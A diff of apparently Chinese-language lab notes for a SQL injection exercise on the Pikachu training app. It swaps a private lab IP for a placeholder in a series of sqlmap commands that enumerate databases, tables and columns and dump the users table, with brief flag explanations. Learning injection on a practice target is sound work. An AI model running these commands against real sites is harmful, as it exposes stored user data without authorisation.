@@ -10,16 +10,16 @@ sqlmap -u "http://ip/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%
 
 --forms 测试表单，--dbs爆库
 
-sqlmap -u "http://192.168.127.130/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu --tables
+sqlmap -u "http://ip/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu --tables
 
 -D指定库 --tables爆表
 
-sqlmap -u "http://192.168.127.130/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --columns
+sqlmap -u "http://ip/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --columns
 
 -T指定表 --columns爆列
 
 
 
-sqlmap -u "http://192.168.127.130/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users -C 列1,列2 --dump
+sqlmap -u "http://ip/pikachu/vul/sqli/sqli_id.php#/" --data="id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users -C 列1,列2 --dump
 
 爆信息
